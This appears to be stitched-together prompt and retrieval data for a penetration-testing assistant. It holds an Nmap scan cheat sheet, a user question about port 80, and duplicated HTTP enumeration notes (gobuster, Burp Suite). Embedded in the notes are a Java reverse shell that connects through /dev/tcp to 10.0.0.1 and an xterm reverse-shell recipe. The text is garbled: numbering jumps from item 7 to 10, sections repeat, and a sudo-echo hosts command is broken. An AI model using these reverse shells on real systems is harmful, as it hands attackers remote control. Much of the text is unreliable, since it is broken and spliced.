Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>
   ```

7. **TCP NULL Scan**:

10. **Operating System Detection**:
    - This scan focuses on identifying the operating system running on the target machine, providing information such as OS type, version, and possible OS families.
    ```
    nmap -O <target-ip>
    ```

11. **Service Version Detection**:
    - This scan probes open ports to identify the services running on them and their versions, helping to assess potential vulnerabilities and security risks.
    ```
    nmap -sV <target-ip>
    ```

12. **RPC Scan**:
    - RPC scan is used specifically to enumerate RPC services on the target machine, revealing information about available RPC services and their versions.

How should i go about investigating the service on port 80? | rag-data: # HTTP


## Service validation
Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django

## Redirect
If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
sudo echo "<IP address> <hostname>" >> /etc/hosts

## Port 80
Port 80 is reserved for web services with HTTP
Port 8080 is commonly used as an alternative to port 80

## Port 443
Port 443 is reserved for HTTPS
Port 8443 is commonly used as an alternative port

## Fuzzing
URL fuzzing:
UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)

Fuzzing for sub-directories
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt

Fuzzing for sub-domains
gobuster dns -d <domain> -w <wordlist>
gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt

## Intercept network traffic
Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.

### Java Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Xterm Reverse Shell

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1

```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
```

## Service validation
Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django

## Redirect
If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
sudo echo "<IP address> <hostname>" >> /etc/hosts

## Port 80
Port 80 is reserved for web services with HTTP
Port 8080 is commonly used as an alternative to port 80

## Port 443
Port 443 is reserved for HTTPS
Port 8443 is commonly used as an alternative port

## Fuzzing
URL fuzzing:
UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)

Fuzzing for sub-directories
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt

Fuzzing for sub-domains
gobuster dns -d <domain> -w <wordlist>
gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt

## Intercept network traffic
Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
